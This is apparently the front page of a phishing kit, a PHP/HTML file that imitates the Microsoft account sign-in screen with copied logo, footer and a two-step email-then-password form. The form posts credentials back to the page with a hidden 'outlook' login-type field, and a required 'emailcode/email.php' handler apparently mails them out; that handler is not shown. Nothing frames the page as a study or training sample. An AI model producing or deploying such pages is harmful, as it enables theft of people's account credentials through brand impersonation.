<?php
require_once('emailcode/email.php')
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Sign in to your Microsoft account</title>



    <link rel="stylesheet" href="css/bootstrap.min.css">
     <!-- Font Awesome CSS -->
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
     <!-- Bootstrap CSS -->
    <link rel="stylesheet" type="text/css" href="css/style.css">

</head>
<body>
<div class="wrap">
	<div class="micro-bg">
    	<div class="outer">
        	<div class="middle">
    			<div class="inner">
        	<div class="banner">
            	<svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24"><title>assets</title><path d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6A5.358,5.358,0,0,1,86.664,9.71a5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,99.7,7.313V8.507h3.469V6.283l2.339-.712V8.507h2.358v1.906h-2.358v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/><rect width="10.931" height="10.931" fill="#f25022"/><rect x="12.069" width="10.931" height="10.931" fill="#7fba00"/><rect y="12.069" width="10.931" height="10.931" fill="#00a4ef"/><rect x="12.069" y="12.069" width="10.931" height="10.931" fill="#ffb900"/></svg>
            </div>
            <form methed="post" name="outlook" action="">
            <div class="main">
            <h2>Sign in</h2>
            <p class="notif"></p>

            <div class="form-group">
            	 <input type="email" class="form-control" id="uemail" name="email" aria-describedby="emailHelp" placeholder="Email, phone, or Skype">
            </div>
            <div class="form-group">
             <button type="button" class="btn btn-primary">Next</button>
             </div>
             <span>No account? <a href="https://signup.live.com">Create one!</a></span>
             </div>
            <div class="main2">
            <div class="identityBanner">
            	<span class="mail-id">dev@gmail.com</span><span class="profile-photo"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48"><title>assets</title><circle cx="24" cy="24" r="24" fill="#e6e6e6"/><path d="M13.44,36h1.92a8.64,8.64,0,1,1,17.28,0h1.92a10.573,10.573,0,0,0-6.569-9.771,7.68,7.68,0,1,0-7.982,0A10.573,10.573,0,0,0,13.44,36Zm4.8-16.32A5.76,5.76,0,1,1,24,25.44,5.766,5.766,0,0,1,18.24,19.68Z" fill="#404040"/></svg></span>
            </div>
            <h2>Enter password</h2>
            <div class="form-group">
            	 <input type="password" class="form-control" name="password" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Password">
            </div>
            <div class="form-row">
            <div class="form-group col">
             <button type="button" class="btn btn-secondary">Back</button>
             </div>
             <div class="form-group col">
              <input type="hidden" name="logintype" value="outlook" >
             <button type="submit" name="submit_btn" class="btn btn-primary">Sign in</button>
             </div>
             </div>
              <div class="form-group form-check">
                <input type="checkbox" class="form-check-input" id="exampleCheck1">
                <label class="form-check-label" for="exampleCheck1">Keep me signed in</label>
              </div>
             <span><a href="javascript:void(0);">Forgot my password</a></span>
             </div>
           </form>
        </div>
        	</div>
        </div>
    </div>
    <div class="footer">
    	<div class="footer-link">
        	<span>©2018 Microsoft</span>
            <a href="javascript:void(0);">Terms of use</a>
            <a href="javascript:void(0);">Privacy & cookies</a>
            <a href="javascript:void(0);"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16"><title>assets</title><path fill="#ffffff" d="M1.143,6.857a1.107,1.107,0,0,1,.446.089,1.164,1.164,0,0,1,.607.607,1.161,1.161,0,0,1,0,.893,1.164,1.164,0,0,1-.607.607,1.107,1.107,0,0,1-.446.089A1.107,1.107,0,0,1,.7,9.054a1.164,1.164,0,0,1-.607-.607,1.161,1.161,0,0,1,0-.893A1.164,1.164,0,0,1,.7,6.946a1.107,1.107,0,0,1,.446-.089M8,6.857a1.107,1.107,0,0,1,.446.089,1.164,1.164,0,0,1,.607.607,1.161,1.161,0,0,1,0,.893,1.164,1.164,0,0,1-.607.607,1.161,1.161,0,0,1-.893,0,1.164,1.164,0,0,1-.607-.607,1.161,1.161,0,0,1,0-.893,1.164,1.164,0,0,1,.607-.607A1.107,1.107,0,0,1,8,6.857m6.857,0a1.107,1.107,0,0,1,.446.089,1.164,1.164,0,0,1,.607.607,1.161,1.161,0,0,1,0,.893,1.164,1.164,0,0,1-.607.607,1.161,1.161,0,0,1-.893,0,1.164,1.164,0,0,1-.607-.607,1.161,1.161,0,0,1,0-.893,1.164,1.164,0,0,1,.607-.607A1.107,1.107,0,0,1,14.857,6.857Z"/></svg></a>
        </div>
    </div>
</div>

    <!-- jQuery first, then Tether, then Bootstrap JS. -->
    <script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
    <script src="js/bootstrap.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function(e) {
    $('.main .btn').click(function() {
        var sEmail = $('#uemail').val();
        if (validateEmail(sEmail)) {
            $('.inner').addClass('open');
            $(".mail-id").empty().append(sEmail);
        }
        else {
             $("p").empty().append("Enter a valid email address, phone number, or Skype name.");
        }
    });
});

function validateEmail(sEmail) {
    var filter = /^([\w-\.]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([\w-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?)$/;
    if (filter.test(sEmail)) {
        return true;
    }
    else {
        return false;
    }
}
    </script>
</body>
</html>
